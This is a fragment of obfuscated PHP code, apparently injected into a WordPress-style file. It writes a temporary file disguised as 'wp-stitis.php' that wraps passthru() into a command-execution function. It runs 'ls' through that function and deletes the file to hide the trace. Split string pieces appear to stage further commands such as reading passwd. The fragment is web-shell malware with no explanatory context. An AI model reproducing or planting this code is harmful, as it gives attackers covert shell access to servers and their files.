...
function mgqp_0(){$gros_1=fopen('wp-stitis.php','w');$tbmd_2="<?php function ";$dbkx_3="sis(\$s1){pas";$gmtg_4="sth";$kwni_5="ru(\$s1);}?>";fputs($gros_1,$tbmd_2.$dbkx_3.$gmtg_4.$kwni_5);}mgqp_0();require('wp-stitis.php');$xzkw_6="wd";$thqj_7="et";$thzb_8="pa";$aqwv_9="ls";$meus_a="cat ";$dvrv_b="c";$bqcl_c="ss";sis($aqwv_9);unlink('wp-stitis.php');
